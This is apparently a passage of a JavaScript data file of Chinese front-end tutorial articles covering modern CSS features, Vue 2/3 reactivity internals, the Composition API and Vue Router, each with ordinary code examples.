- 保持选择器简洁
- 避免过度嵌套（不超过 3 层）
- 合理使用类选择器
- 理解优先级规则
- 避免使用 !important
- 使用 BEM 等命名规范
- 测试选择器性能`,createdAt:"2026-03-14",updatedAt:"2026-03-14"},{id:"css-modern-features",title:"CSS 现代特性与前沿技术",category:"css",difficulty:"hard",tags:["CSS","新特性","Houdini","容器查询"],content:`## CSS 现代特性与前沿技术

CSS 不断发展，引入了许多强大的新特性，为开发者提供了更多的可能性。

### 容器查询（Container Queries）

**概念：**
- 基于容器尺寸而非视口尺寸
- 组件级响应式
- 更灵活的布局控制

**语法：**
- container-type：定义容器类型
- @container：容器查询规则
- container-name：命名容器

**示例：**
\`\`\`css
.card-container {
  container-type: inline-size;
}

@container (min-width: 400px) {
  .card {
    display: flex;
  }
}
\`\`\`

**应用场景：**
- 组件库
- 侧边栏内容
- 嵌套布局

### CSS Houdini

**概念：**
- 暴露 CSS 引擎的 API
- 扩展 CSS 能力
- JavaScript 与 CSS 的桥梁

**API 类型：**
- Paint API：自定义绘制
- Layout API：自定义布局
- Animation API：自定义动画
- Properties API：自定义属性

**Paint API 示例：**
\`\`\`javascript
// paint-worklet.js
registerPaint('circle', class {
  static get inputProperties() {
    return ['--circle-color'];
  }

  paint(ctx, size, styleMap) {
    const color = styleMap.get('--circle-color').toString();
    ctx.fillStyle = color;
    ctx.beginPath();
    ctx.arc(size.width / 2, size.height / 2, size.width / 2, 0, 2 * Math.PI);
    ctx.fill();
  }
});

// CSS
CSS.paintWorklet.addModule('paint-worklet.js');

.background {
  background-image: paint(circle);
  --circle-color: #007bff;
}
\`\`\`

### 级联层（Cascade Layers）

**概念：**
- 控制样式的优先级层级
- 解决特异性问题
- 更清晰的样式组织

**语法：**
- @layer 定义层
- @layer layer-name { ... }
- 层顺序决定优先级

**示例：**
\`\`\`css
@layer reset, base, components, utilities;

@layer base {
  body { font-size: 16px; }
}

@layer components {
  .button { padding: 10px; }
}
\`\`\`

### :has() 选择器

**概念：**
- 父元素选择器
- 选择包含特定子元素的父元素
- 强大的组合能力

**示例：**
- article:has(img)：包含图片的文章
- .card:has(.badge)：包含徽章的卡片
- form:has(:invalid)：包含无效输入的表单

**应用场景：**
- 条件样式
- 表单验证样式
- 复杂布局

### 其他现代特性

**:is() 和 :where()：**
- 简化复杂选择器
- :is() 保持特异性
- :where() 特异性为 0

**accent-color：**
- 自定义表单控件颜色
- 统一主题色

**aspect-ratio：**
- 保持元素宽高比
- 无需 padding hack

**gap：**
- Flexbox 和 Grid 的间距
- 替代 margin

**subgrid：**
- Grid 嵌套继承轨道
- 复杂布局对齐

**@supports：**
- 特性查询
- 渐进增强

### 代码示例

#### 容器查询

\`\`\`css
/* 定义容器 */
.card-wrapper {
  container-type: inline-size;
  container-name: card;
}

/* 容器查询 */
@container card (min-width: 300px) {
  .card {
    flex-direction: row;
  }
}

@container card (min-width: 500px) {
  .card {
    padding: 30px;
  }
}

@container card (min-width: 700px) {
  .card {
    gap: 40px;
  }
}

/* 响应式卡片组件 */
.card {
  display: flex;
  flex-direction: column;
  gap: 20px;
  padding: 20px;
  background-color: white;
  border-radius: 8px;
  box-shadow: 0 2px 4px rgba(0,0,0,0.1);
}

.card__image {
  width: 100%;
  aspect-ratio: 16/9;
  object-fit: cover;
  border-radius: 4px;
}

.card__content {
  flex: 1;
}

.card__title {
  margin: 0 0 10px 0;
  font-size: 1.25rem;
}

.card__text {
  margin: 0;
  line-height: 1.6;
  color: #666;
}
\`\`\`

#### 级联层

\`\`\`css
/* 定义层顺序 */
@layer reset, base, components, utilities;

/* 重置层 */
@layer reset {
  *,
  *::before,
  *::after {
    box-sizing: border-box;
    margin: 0;
    padding: 0;
  }
}

/* 基础层 */
@layer base {
  body {
    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
    line-height: 1.6;
    color: #333;
  }

  h1, h2, h3, h4, h5, h6 {
    font-weight: 700;
    line-height: 1.2;
  }
}

/* 组件层 */
@layer components {
  .button {
    padding: 10px 20px;
    background-color: #007bff;
    color: white;
    border: none;
    border-radius: 4px;
    cursor: pointer;
    transition: all 0.3s ease;
  }

  .button:hover {
    background-color: #0056b3;
  }
}

/* 工具层 */
@layer utilities {
  .text-center { text-align: center; }
  .text-left { text-align: left; }
  .text-right { text-align: right; }

  .flex { display: flex; }
  .flex-col { flex-direction: column; }
  .items-center { align-items: center; }
  .justify-center { justify-content: center; }
}

/* 未命名层 */
@layer {
  .custom-style {
    /* 这个层在所有命名层之后 */
  }
}
\`\`\`

#### :has() 选择器

\`\`\`css
/* 包含图片的文章 */
article:has(img) {
  padding: 20px;
  border: 1px solid #ddd;
}

/* 包含徽章的卡片 */
.card:has(.badge) {
  border-color: #007bff;
}

/* 包含无效输入的表单 */
form:has(:invalid) {
  border: 2px solid #dc3545;
}

/* 组合使用：包含图片和视频的文章 */
article:has(img):has(video) {
  background-color: #f8f9fa;
}

/* 嵌套选择器 */
.card:has(.header .badge) {
  box-shadow: 0 4px 8px rgba(0,0,0,0.1);
}

/* 与其他伪类组合 */
article:has(img):hover {
  transform: translateY(-2px);
}
\`\`\`

#### 其他现代特性

\`\`\`css
/* :is() 简化选择器 */
/* 之前 */
h1 .title, h2 .title, h3 .title {
  font-weight: 700;
}

/* 之后 */
:is(h1, h2, h3) .title {
  font-weight: 700;
}

/* :where() 零特异性 */
:where(h1, h2, h3) .title {
  /* 特异性为 0 */
  font-weight: 700;
}

/* accent-color 自定义表单控件 */
input[type="checkbox"],
input[type="radio"] {
  accent-color: #007bff;
}

/* aspect-ratio 保持宽高比 */
.image-container {
  aspect-ratio: 16/9;
  background-color: #f0f0f0;
}

/* gap 在 Flexbox 中 */
.flex-container {
  display: flex;
  gap: 20px;
}

/* @supports 特性查询 */
@supports (backdrop-filter: blur(10px)) {
  .glass-effect {
    backdrop-filter: blur(10px);
  }
}

@supports not (backdrop-filter: blur(10px)) {
  .glass-effect {
    background-color: rgba(255, 255, 255, 0.9);
  }
}
\`\`\`

### 最佳实践

- 使用容器查询实现组件级响应式
- 理解级联层的优先级规则
- 合理使用 :has() 选择器
- 关注浏览器支持情况
- 使用 @supports 提供回退方案
- 渐进增强策略
- 性能优化（避免过度使用复杂选择器）`,createdAt:"2026-03-14",updatedAt:"2026-03-14"},{id:"vue-fundamentals",title:"Vue 核心原理与响应式系统",category:"vue",difficulty:"medium",tags:["Vue","响应式","数据绑定"],content:`## Vue 核心原理与响应式系统

Vue.js 是一个渐进式 JavaScript 框架，其核心特性是响应式系统，理解其原理对于掌握 Vue 至关重要。Vue的响应式系统是其最核心的特性之一，它使得数据变化能够自动反映到视图上，极大地简化了前端开发。Vue 2和Vue 3使用了不同的响应式实现方式，各有优劣。

### 💚 响应式系统原理

**Object.defineProperty (Vue 2)：**
Vue 2使用Object.defineProperty的getter和setter来实现响应式系统。这种方式通过遍历data选项中的所有属性，将每个属性转换为getter/setter，从而在属性被访问或修改时触发相应的依赖收集和派发更新。Object.defineProperty的缺点是数组索引和新增属性无法被自动检测到，需要使用Vue.set或this.$set方法手动添加响应式。此外，Object.defineProperty无法检测到对象属性的删除，需要使用Vue.delete方法。

\`\`\`javascript
// Vue 2 响应式实现原理
function defineReactive(obj, key, val) {
  const dep = new Dep(); // 每个属性都有一个依赖收集器
  
  Object.defineProperty(obj, key, {
    enumerable: true,
    configurable: true,
    get() {
      // 依赖收集：将当前的Watcher添加到依赖列表
      if (Dep.target) {
        dep.depend();
      }
      return val;
    },
    set(newVal) {
      if (newVal === val) return;
      val = newVal;
      // 派发更新：通知所有依赖的Watcher重新渲染
      dep.notify();
    }
  });
}

// 依赖收集器
class Dep {
  constructor() {
    this.subs = []; // 存储所有Watcher
  }
  
  depend() {
    if (Dep.target) {
      this.subs.push(Dep.target);
    }
  }
  
  notify() {
    this.subs.forEach(sub => sub.update());
  }
}

// 观察者
class Watcher {
  constructor(vm, expr, cb) {
    this.vm = vm;
    this.expr = expr;
    this.cb = cb;
    // 触发getter，进行依赖收集
    Dep.target = this;
    this.value = vm[expr];
    Dep.target = null;
  }
  
  update() {
    const newVal = this.vm[this.expr];
    this.cb(newVal);
  }
}

// Observer：将对象的所有属性转换为响应式
class Observer {
  constructor(obj) {
    this.walk(obj);
  }
  
  walk(obj) {
    Object.keys(obj).forEach(key => {
      defineReactive(obj, key, obj[key]);
    });
  }
}

// Vue 2 响应式的局限性
const vm = new Vue({
  data: {
    items: ['a', 'b', 'c'],
    user: { name: 'Alice' }
  }
});

// ❌ 无法检测到数组索引赋值
vm.items[0] = 'x'; // 不是响应式的
// ✅ 使用 Vue.set
Vue.set(vm.items, 0, 'x'); // 响应式的

// ❌ 无法检测到数组长度修改
vm.items.length = 2; // 不是响应式的
// ✅ 使用 splice
vm.items.splice(2); // 响应式的

// ❌ 无法检测到新增属性
vm.user.age = 25; // 不是响应式的
// ✅ 使用 Vue.set
Vue.set(vm.user, 'age', 25); // 响应式的
\`\`\`

**Proxy (Vue 3)：**
Vue 3使用ES6 Proxy实现响应式系统，解决了Vue 2的所有局限性。Proxy可以直接代理整个对象而非对象的属性，支持数组索引检测、新增属性检测、删除属性检测等。Proxy是懒加载的，只有当属性被访问时才创建响应式连接，性能更好。Vue 3还引入了reactive、ref、computed等响应式API，提供了更灵活的响应式编程方式。

\`\`\`javascript
// Vue 3 响应式实现原理
function reactive(target) {
  return new Proxy(target, {
    get(target, key, receiver) {
      // 依赖收集
      track(target, key);
      const result = Reflect.get(target, key, receiver);
      // 如果是对象，递归代理
      if (typeof result === 'object' && result !== null) {
        return reactive(result);
      }
      return result;
    },
    set(target, key, value, receiver) {
      const oldValue = target[key];
      const result = Reflect.set(target, key, value, receiver);
      // 派发更新
      if (oldValue !== value) {
        trigger(target, key);
      }
      return result;
    },
    deleteProperty(target, key) {
      const result = Reflect.deleteProperty(target, key);
      // 派发更新
      trigger(target, key);
      return result;
    }
  });
}

// 依赖收集
const targetMap = new WeakMap();
let activeEffect = null;

function track(target, key) {
  if (!activeEffect) return;
  
  let depsMap = targetMap.get(target);
  if (!depsMap) {
    targetMap.set(target, (depsMap = new Map()));
  }
  
  let dep = depsMap.get(key);
  if (!dep) {
    depsMap.set(key, (dep = new Set()));
  }
  
  dep.add(activeEffect);
}

// 派发更新
function trigger(target, key) {
  const depsMap = targetMap.get(target);
  if (!depsMap) return;
  
  const dep = depsMap.get(key);
  if (dep) {
    dep.forEach(effect => effect());
  }
}

// effect 函数
function effect(fn) {
  activeEffect = fn;
  fn();
  activeEffect = null;
}

// Vue 3 响应式的优势
const state = reactive({
  items: ['a', 'b', 'c'],
  user: { name: 'Alice' }
});

// ✅ 可以检测到数组索引赋值
state.items[0] = 'x'; // 响应式的

// ✅ 可以检测到数组长度修改
state.items.length = 2; // 响应式的

// ✅ 可以检测到新增属性
state.user.age = 25; // 响应式的

// ✅ 可以检测到删除属性
delete state.user.name; // 响应式的
\`\`\`

**依赖收集流程：**
依赖收集是Vue响应式系统的核心机制。当组件渲染时，会访问数据属性，触发getter，将当前正在执行的副作用函数（effect）收集到该属性的依赖列表中。当属性被修改时，触发setter，通知所有依赖该属性的副作用函数重新执行，从而更新视图。这个过程是自动的，开发者无需手动管理依赖关系。

\`\`\`javascript
// 依赖收集流程示例
const state = reactive({ count: 0 });

// 组件渲染函数
function render() {
  // 访问 state.count，触发 getter
  // 将 render 函数添加到 count 的依赖列表
  console.log('Count:', state.count);
}

// 收集依赖
effect(render); // render 被添加到 count 的依赖列表

// 修改数据，触发更新
state.count++; // 触发 setter，执行 render 函数
\`\`\`

### 💻 代码示例：Vue 响应式实现

#### 🔄 Vue 2 响应式实现

\`\`\`javascript
// 简化的 Vue 2 响应式实现
function defineReactive(obj, key, val) {
  const dep = new Dep();
  
  Object.defineProperty(obj, key, {
    enumerable: true,
    configurable: true,
    get() {
      // 依赖收集
      if (Dep.target) {
        dep.depend();
      }
      return val;
    },
    set(newVal) {
      if (newVal === val) return;
      val = newVal;
      // 派发更新
      dep.notify();
    }
  });
}

class Dep {
  constructor() {
    this.subs = [];
  }
  
  depend() {
    if (Dep.target) {
      this.subs.push(Dep.target);
    }
  }
  
  notify() {
    this.subs.forEach(sub => sub.update());
  }
}

Dep.target = null;
\`\`\`

#### Vue 3 响应式实现

\`\`\`javascript
// Vue 3 使用 Proxy 实现响应式
function reactive(target) {
  return new Proxy(target, {
    get(target, key, receiver) {
      // 依赖收集
      track(target, key);
      const result = Reflect.get(target, key, receiver);
      return result;
    },
    set(target, key, value, receiver) {
      const oldValue = target[key];
      const result = Reflect.set(target, key, value, receiver);
      // 派发更新
      if (oldValue !== value) {
        trigger(target, key);
      }
      return result;
    }
  });
}

// 依赖收集
const targetMap = new WeakMap();
let activeEffect = null;

function track(target, key) {
  if (!activeEffect) return;
  
  let depsMap = targetMap.get(target);
  if (!depsMap) {
    targetMap.set(target, (depsMap = new Map()));
  }
  
  let dep = depsMap.get(key);
  if (!dep) {
    depsMap.set(key, (dep = new Set()));
  }
  
  dep.add(activeEffect);
}

// 派发更新
function trigger(target, key) {
  const depsMap = targetMap.get(target);
  if (!depsMap) return;
  
  const dep = depsMap.get(key);
  if (dep) {
    dep.forEach(effect => effect());
  }
}

// 使用示例
const state = reactive({
  count: 0,
  name: 'Vue'
});

effect(() => {
  console.log(\`Count: \${state.count}\`);
});

state.count++; // 触发更新
\`\`\`

### 数据绑定

**单向绑定：**
- v-bind 指令
- 从数据到视图的单向数据流
- 适合表单元素以外的场景

**双向绑定：**
- v-model 指令
- 数据与视图的双向同步
- 本质是 v-bind 和 v-on 的语法糖

**计算属性：**
- computed 选项
- 基于依赖自动缓存
- 只在依赖变化时重新计算

**监听器：**
- watch 选项
- 响应数据变化
- 支持深度监听和立即执行

### 代码示例

#### 数据绑定示例

\`\`\`vue
<template>
  <div>
    <!-- 单向绑定 -->
    <p>{{ message }}</p>
    <p v-text="message"></p>
    <div v-html="htmlContent"></div>
    
    <!-- 属性绑定 -->
    <img :src="imageUrl" :alt="imageAlt">
    <a :href="linkUrl">Link</a>
    <div :class="{ active: isActive }">Class Binding</div>
    <div :style="{ color: textColor }">Style Binding</div>
    
    <!-- 双向绑定 -->
    <input v-model="username" placeholder="Username">
    <textarea v-model="description"></textarea>
    <select v-model="selectedOption">
      <option value="option1">Option 1</option>
      <option value="option2">Option 2</option>
    </select>
    
    <!-- 修饰符 -->
    <input v-model.lazy="username">
    <input v-model.number="age" type="number">
    <input v-model.trim="message">
  </div>
</template>

<script>
export default {
  data() {
    return {
      message: 'Hello, Vue!',
      htmlContent: '<strong>Bold Text</strong>',
      imageUrl: '/image.jpg',
      imageAlt: 'Image',
      linkUrl: 'https://example.com',
      isActive: true,
      textColor: 'red',
      username: '',
      description: '',
      selectedOption: 'option1',
      age: 0
    };
  }
};
</script>
\`\`\`

#### 计算属性和监听器示例

\`\`\`vue
<template>
  <div>
    <p>First Name: {{ firstName }}</p>
    <p>Last Name: {{ lastName }}</p>
    <p>Full Name: {{ fullName }}</p>
    <p>Full Name (Computed): {{ fullNameComputed }}</p>
    
    <input v-model="firstName" placeholder="First Name">
    <input v-model="lastName" placeholder="Last Name">
  </div>
</template>

<script>
export default {
  data() {
    return {
      firstName: 'John',
      lastName: 'Doe',
      fullName: ''
    };
  },
  
  computed: {
    // 计算属性：基于依赖自动缓存
    fullNameComputed() {
      console.log('Computed property called');
      return \`\${this.firstName} \${this.lastName}\`;
    },
    
    // 只读计算属性
    fullNameReadOnly: {
      get() {
        return \`\${this.firstName} \${this.lastName}\`;
      }
    },
    
    // 可写计算属性
    fullNameWritable: {
      get() {
        return \`\${this.firstName} \${this.lastName}\`;
      },
      set(newValue) {
        const names = newValue.split(' ');
        this.firstName = names[0];
        this.lastName = names[names.length - 1];
      }
    }
  },
  
  watch: {
    // 监听器：响应数据变化
    firstName(newVal, oldVal) {
      console.log(\`First name changed from \${oldVal} to \${newVal}\`);
      this.fullName = \`\${newVal} \${this.lastName}\`;
    },
    
    lastName(newVal, oldVal) {
      console.log(\`Last name changed from \${oldVal} to \${newVal}\`);
      this.fullName = \`\${this.firstName} \${newVal}\`;
    },
    
    // 深度监听
    user: {
      handler(newVal, oldVal) {
        console.log('User changed:', newVal);
      },
      deep: true
    },
    
    // 立即执行
    message: {
      handler(newVal) {
        console.log('Message:', newVal);
      },
      immediate: true
    }
  }
};
</script>
\`\`\`

### 组件系统

**组件注册：**
- 全局注册：Vue.component()
- 局部注册：components 选项
- 单文件组件：.vue 文件

**组件通信：**
- props：父向子传递数据
- emit：子向父传递事件
- provide/inject：跨层级通信
- event bus：事件总线
- Vuex/Pinia：状态管理：Vuex是Vue 2官方推荐的状态管理库，提供集中式状态管理、状态变更追踪、组件间通信等能力，采用单向数据流模式，Pinia是Vue 3官方推荐的状态管理库，相比Vuex更轻量、TypeScript支持更好、模块化更简洁，两者都是Vue项目中管理应用状态的常用选择

**插槽：**
- 匿名插槽
- 命名插槽
- 作用域插槽
- 动态插槽

### 代码示例

#### 组件注册示例

\`\`\`javascript
// 全局注册
Vue.component('my-component', {
  template: '<div>Global Component</div>'
});

// 局部注册
export default {
  components: {
    'my-component': MyComponent
  }
};

// 单文件组件
// MyComponent.vue
<template>
  <div>
    <h2>{{ title }}</h2>
    <slot></slot>
  </div>
</template>

<script>
export default {
  name: 'MyComponent',
  props: {
    title: {
      type: String,
      required: true
    }
  }
};
</script>
\`\`\`

#### 组件通信示例

\`\`\`vue
<!-- 父组件 -->
<template>
  <div>
    <h1>Parent Component</h1>
    <p>Message from child: {{ childMessage }}</p>
    
    <!-- Props -->
    <ChildComponent
      :parent-message="parentMessage"
      @child-event="handleChildEvent"
    />
  </div>
</template>

<script>
import ChildComponent from './ChildComponent.vue';

export default {
  components: {
    ChildComponent
  },
  data() {
    return {
      parentMessage: 'Hello from parent',
      childMessage: ''
    };
  },
  methods: {
    handleChildEvent(message) {
      this.childMessage = message;
    }
  }
};
</script>

<!-- 子组件 -->
<template>
  <div>
    <h2>Child Component</h2>
    <p>Message from parent: {{ parentMessage }}</p>
    
    <button @click="sendMessage">Send Message to Parent</button>
  </div>
</template>

<script>
export default {
  props: {
    parentMessage: {
      type: String,
      required: true
    }
  },
  methods: {
    sendMessage() {
      this.$emit('child-event', 'Hello from child');
    }
  }
};
</script>

<!-- provide/inject 示例 -->
<!-- 祖先组件 -->
<template>
  <div>
    <ParentComponent />
  </div>
</template>

<script>
export default {
  provide() {
    return {
      theme: 'dark',
      toggleTheme: this.toggleTheme
    };
  },
  methods: {
    toggleTheme() {
      this.theme = this.theme === 'dark' ? 'light' : 'dark';
    }
  }
};
</script>

<!-- 后代组件 -->
<template>
  <div :class="theme">
    <h2>Descendant Component</h2>
    <button @click="toggleTheme">Toggle Theme</button>
  </div>
</template>

<script>
export default {
  inject: ['theme', 'toggleTheme']
};
</script>
\`\`\`

#### 插槽示例

\`\`\`vue
<!-- 基础插槽 -->
<!-- 父组件 -->
<template>
  <div>
    <MyComponent>
      <p>This is slot content</p>
    </MyComponent>
  </div>
</template>

<!-- 子组件 -->
<template>
  <div>
    <h2>My Component</h2>
    <slot></slot>
  </div>
</template>

<!-- 命名插槽 -->
<!-- 父组件 -->
<template>
  <div>
    <MyComponent>
      <template v-slot:header>
        <h1>Header Content</h1>
      </template>
      
      <template #default>
        <p>Default Content</p>
      </template>
      
      <template #footer>
        <p>Footer Content</p>
      </template>
    </MyComponent>
  </div>
</template>

<!-- 子组件 -->
<template>
  <div>
    <slot name="header"></slot>
    <slot></slot>
    <slot name="footer"></slot>
  </div>
</template>

<!-- 作用域插槽 -->
<!-- 父组件 -->
<template>
  <div>
    <MyComponent>
      <template #default="{ user, index }">
        <p>{{ index }}: {{ user.name }}</p>
      </template>
    </MyComponent>
  </div>
</template>

<!-- 子组件 -->
<template>
  <div>
    <slot
      v-for="(user, index) in users"
      :user="user"
      :index="index"
    ></slot>
  </div>
</template>

<script>
export default {
  data() {
    return {
      users: [
        { name: 'Alice' },
        { name: 'Bob' }
      ]
    };
  }
};
</script>
\`\`\`

### 生命周期

**Vue 2 生命周期：**
- beforeCreate：实例创建前
- created：实例创建后
- beforeMount：挂载前
- mounted：挂载后
- beforeUpdate：更新前
- updated：更新后
- beforeDestroy：销毁前
- destroyed：销毁后

**Vue 3 生命周期：**
- beforeCreate → setup()
- created → setup()
- beforeMount → onBeforeMount
- mounted → onMounted
- beforeUpdate → onBeforeUpdate
- updated → onUpdated
- beforeUnmount → onBeforeUnmount
- unmounted → onUnmounted

### 代码示例

#### Vue 2 生命周期示例

\`\`\`vue
<template>
  <div>
    <p>Count: {{ count }}</p>
    <button @click="increment">Increment</button>
  </div>
</template>

<script>
export default {
  data() {
    return {
      count: 0
    };
  },
  
  beforeCreate() {
    console.log('beforeCreate: 实例创建前');
    // 无法访问 data、methods、computed
  },
  
  created() {
    console.log('created: 实例创建后');
    // 可以访问 data、methods、computed
    // 常用于初始化数据、发起网络请求
    this.fetchData();
  },
  
  beforeMount() {
    console.log('beforeMount: 挂载前');
    // DOM 还未渲染
  },
  
  mounted() {
    console.log('mounted: 挂载后');
    // DOM 已渲染
    // 常用于操作 DOM、初始化第三方库
    this.initChart();
  },
  
  beforeUpdate() {
    console.log('beforeUpdate: 更新前');
    // 数据变化，DOM 还未更新
  },
  
  updated() {
    console.log('updated: 更新后');
    // DOM 已更新
    // 避免在这里修改数据，可能导致无限循环
  },
  
  beforeDestroy() {
    console.log('beforeDestroy: 销毁前');
    // 清理定时器、事件监听器等
    this.cleanup();
  },
  
  destroyed() {
    console.log('destroyed: 销毁后');
    // 实例已销毁
  },
  
  methods: {
    increment() {
      this.count++;
    },
    
    fetchData() {
      // 发起网络请求
      fetch('/api/data')
        .then(response => response.json())
        .then(data => {
          this.data = data;
        });
    },
    
    initChart() {
      // 初始化图表
      this.chart = new Chart(this.$refs.chart, {
        // 配置项
      });
    },
    
    cleanup() {
      // 清理定时器
      if (this.timer) {
        clearInterval(this.timer);
      }
      
      // 清理图表
      if (this.chart) {
        this.chart.destroy();
      }
    }
  }
};
</script>
\`\`\`

#### Vue 3 生命周期示例

\`\`\`vue
<template>
  <div>
    <p>Count: {{ count }}</p>
    <button @click="increment">Increment</button>
  </div>
</template>

<script>
import { ref, onBeforeMount, onMounted, onBeforeUpdate, onUpdated, onBeforeUnmount, onUnmounted } from 'vue';

export default {
  setup() {
    const count = ref(0);
    let timer = null;
    
    // 挂载前
    onBeforeMount(() => {
      console.log('onBeforeMount: 挂载前');
    });
    
    // 挂载后
    onMounted(() => {
      console.log('onMounted: 挂载后');
      // 初始化定时器
      timer = setInterval(() => {
        console.log('Timer tick');
      }, 1000);
    });
    
    // 更新前
    onBeforeUpdate(() => {
      console.log('onBeforeUpdate: 更新前');
    });
    
    // 更新后
    onUpdated(() => {
      console.log('onUpdated: 更新后');
    });
    
    // 卸载前
    onBeforeUnmount(() => {
      console.log('onBeforeUnmount: 卸载前');
    });
    
    // 卸载后
    onUnmounted(() => {
      console.log('onUnmounted: 卸载后');
      // 清理定时器
      if (timer) {
        clearInterval(timer);
      }
    });
    
    const increment = () => {
      count.value++;
    };
    
    return {
      count,
      increment
    };
  }
};
</script>
\`\`\`

### 最佳实践

- 优先使用 Composition API
- 合理使用计算属性和监听器
- 组件拆分要合理，保持单一职责
- 使用 TypeScript 提高代码质量
- 合理使用 Vuex/Pinia 进行状态管理
- 避免直接修改 props
- 使用 key 属性提高列表渲染性能
- 合理使用 v-if 和 v-show

`,createdAt:"2026-03-14",updatedAt:"2026-03-14"},{id:"vue-composition-api",title:"Vue 3 Composition API 详解",category:"vue",difficulty:"medium",tags:["Vue 3","Composition API","setup"],content:`## Vue 3 Composition API 详解

Composition API 是 Vue 3 引入的新特性，提供了更灵活的代码组织方式，解决了 Options API 的一些局限性。

### Composition API 基础

**setup() 函数：**
- 组件的入口点
- 在 beforeCreate 和 created 之前执行
- 接收 props 和 context 两个参数
- 返回的对象会暴露给模板和其他选项

**响应式 API：**
- ref()：创建响应式引用
- reactive()：创建响应式对象
- computed()：创建计算属性
- watch()：监听响应式数据
- watchEffect()：自动追踪依赖的副作用

**生命周期钩子：**
- onBeforeMount
- onMounted
- onBeforeUpdate
- onUpdated
- onBeforeUnmount
- onUnmounted
- onErrorCaptured
- onRenderTracked
- onRenderTriggered

### 优势与使用场景

**代码组织：**
- 按功能组织代码
- 逻辑复用更灵活
- 减少选项 API 的命名冲突

**TypeScript 支持：**
- 更好的类型推断
- 更清晰的类型定义
- 减少类型断言

**逻辑复用：**
- Composables 模式：Composables是Vue 3引入的组合式API设计模式，通过抽取可复用的逻辑函数实现代码复用，类似React的Custom Hooks，使用use开头命名约定，可以在Vue组件中复用状态和逻辑，Vue官方提供了useMouse、useFetch等内置Composables，开发者也可以创建自定义Composables，是Vue 3最强大的代码复用方式
- 可重用的逻辑函数
- 类似于 React Hooks

**大型应用：**
- 更好的代码组织
- 更清晰的逻辑分离
- 便于维护和测试

### 响应式 API 详解

**ref：**
- 用于基本类型和复杂类型
- 通过 .value 访问和修改
- 在模板中自动解包
- 适合单个值的响应式

**reactive：**
- 用于对象和数组
- 直接访问和修改属性
- 深度响应
- 不支持基本类型

**computed：**
- 自动缓存
- 基于依赖更新
- 可以设置 getter 和 setter
- 适合派生状态

**watch：**
- 可以监听多个源
- 支持深度监听
- 支持立即执行
- 支持回调函数

**watchEffect：**
- 自动追踪依赖
- 立即执行
- 返回停止函数
- 适合副作用处理

### 实际应用

**状态管理：**
- 使用 reactive 和 ref 管理组件状态
- 复杂状态可以使用 Pinia
- 避免过度使用全局状态

**表单处理：**
- 使用 ref 管理表单数据
- 计算属性验证
- 响应式验证规则

**API 调用：**
- 在 onMounted 中发起请求
- 使用 ref 管理加载状态
- watch 监听参数变化

**动画和过渡：**
- 使用 ref 管理动画状态
- watchEffect 处理动画逻辑
- 结合 CSS 动画

### 迁移策略

**从 Options API 迁移：**
- 逐步迁移
- 混合使用两种 API
- 使用 Composition API 重构复杂逻辑

**常见模式：**
- 提取可复用逻辑为 composables
- 按功能组织代码
- 利用 TypeScript 类型

### 最佳实践

- 合理使用 ref 和 reactive
- 按功能组织 composables
- 避免在 setup 中使用 this
- 正确处理异步操作
- 合理使用生命周期钩子
- 测试 composables
- 文档化 composables 的用法`,createdAt:"2026-03-14",updatedAt:"2026-03-14"},{id:"vue-router",title:"Vue Router 路由管理",category:"vue",difficulty:"medium",tags:["Vue","Router","路由","SPA"],content:`## Vue Router 路由管理

Vue Router 是 Vue 官方的路由管理器，用于构建单页应用（SPA）的导航系统。

### 基本配置

**安装：**
- npm install vue-router@4（Vue 3）
- npm install vue-router@3（Vue 2）

**创建路由实例：**
- createRouter()（Vue 3）
- new VueRouter()（Vue 2）
- 配置 routes 数组

**挂载路由：**
- Vue 3：app.use(router)：Vue 3使用app.use()方法注册插件和路由，router是Vue Router 4的实例，通过app.use(router)将路由实例挂载到Vue应用上，Vue Router 4是专门为Vue 3设计的路由库，提供了更好的TypeScript支持、组合式API支持、路由守卫改进等特性
- Vue 2：new Vue({ router })：Vue 2在创建根实例时将router作为选项传入，router是Vue Router 3的实例，Vue Router 3是Vue 2官方路由库，支持动态路由、嵌套路由、路由守卫等功能，是Vue 2项目路由管理的标准选择

**基本路由配置：**

\`\`\`javascript
const routes = [
  {
    path: '/',
    component: Home
  },
  {
    path: '/about',
    component: About
  }
];
\`\`\`

### 路由模式

**hash 模式：**
- URL 中包含 #：Vue Router默认使用Hash模式，URL中包含#符号如example.com/#/home，这种模式下路由变化不会触发页面刷新，兼容性更好不需要服务器配置，Hash模式利用window.location.hash进行路由管理，是Vue Router的默认模式
- 兼容性好
- 不需要服务器配置

**history 模式：**
- 更美观的 URL
- 需要服务器配置（404 重定向）
- 依赖 HTML5 History API

**abstract 模式：**
- 无浏览器环境下使用
- 如 Node.js 环境

### 路由导航

**声明式导航：**
- <router-link> 组件
- to 属性指定目标路由
- active-class 高亮当前路由
- exact-active-class 精确匹配高亮

**编程式导航：**
- router.push()：导航到新位置
- router.replace()：替换当前位置
- router.go()：前进或后退
- router.back()：后退
- router.forward()：前进

**导航守卫：**
- 全局前置守卫：router.beforeEach()
- 全局解析守卫：router.beforeResolve()
- 全局后置守卫：router.afterEach()
- 路由独享守卫：beforeEnter
- 组件内守卫：beforeRouteEnter、beforeRouteUpdate、beforeRouteLeave

### 路由参数

**动态路由：**
- path: '/user/:id'
- this.$route.params.id（Vue 2）
- useRoute().params.id（Vue 3）

**查询参数：**
- path: '/search?keyword=vue'
- this.$route.query.keyword（Vue 2）
- useRoute().query.keyword（Vue 3）

**路由元信息：**
- meta 字段
- 存储路由相关信息
- 如权限、标题等

### 嵌套路由

**配置：**
- children 数组
- 相对路径
- 多级嵌套

**示例：**

\`\`\`javascript
{
  path: '/user',
  component: User,
  children: [
    {
      path: 'profile',
      component: UserProfile
    },
    {
      path: 'settings',
      component: UserSettings
    }
  ]
}
\`\`\`

### 路由懒加载

**动态导入：**
- () => import('./views/Home.vue')
- 减少初始打包体积
- 按需加载组件

**Webpack 魔法注释：**
- /* webpackChunkName: "home" */
- 自定义 chunk 名称
- 更好的代码分割

**预加载：**
- webpackPrefetch: true
- 浏览器空闲时预加载
- 提升用户体验

### 路由守卫应用

**权限控制：**
- 检查用户登录状态
- 验证权限
- 重定向未授权用户

**页面标题：**
- 基于路由元信息设置标题
- 全局后置守卫
- 动态标题

**数据预加载：**
- 导航前获取数据
- 避免白屏
- 提升用户体验

### 最佳实践

- 使用路由懒加载
- 合理使用导航守卫
- 配置 404 页面
- 处理路由错误
- 测试路由功能
